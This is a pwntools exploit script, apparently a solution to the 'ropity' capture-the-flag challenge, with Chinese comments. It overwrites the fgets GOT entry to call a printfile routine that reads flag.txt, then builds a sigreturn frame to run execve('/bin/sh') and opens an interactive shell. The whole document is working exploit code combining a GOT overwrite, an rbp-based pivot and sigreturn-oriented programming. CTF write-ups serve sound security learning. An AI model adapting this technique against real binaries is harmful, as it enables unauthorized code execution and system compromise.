from pwn import *
context(arch='amd64', log_level='debug')
elf = ELF('./vuln')
p = process('./vuln')
# gdb.attach(p, "b*0x40115a\nc")
#p = remote('ropity.chal.imaginaryctf.org', 1337)
#1,rbp=got.fgets+8 保留rbp再入mian将 payload2 读入got.fgets ...
p.sendline(flat(b'a'*8,elf.got['fgets']+8, 0x401142))
#将printfile写入got.fgets 并设rbp-8=&flag.txt flag.txt在404030再入main
#main中设置rdi后执行printfile 返回flag.txt字符数rax=15
payload = b""
payload += p64(elf.sym['printfile']) # got.fgets = printfile
payload += p64(0x404038) # rbp-8 = &flag.txt
payload += p64(0x401142) #printfile no rbp
payload += b"flag.txt"
payload += p64(0)
#syscall(15)进行sigreturn
frame = SigreturnFrame()
frame.rax = 59
frame.rip = 0x401198 #syscall;pop rbp;ret
frame.rdi = 0x404048 + 160
frame.rsi = 0
frame.rdx = 0
frame.rsp = u64(b"/bin/sh\0")
payload += p64(0x401198) # syscall
payload += bytes(frame)
p.sendline(payload)
p.interactive()
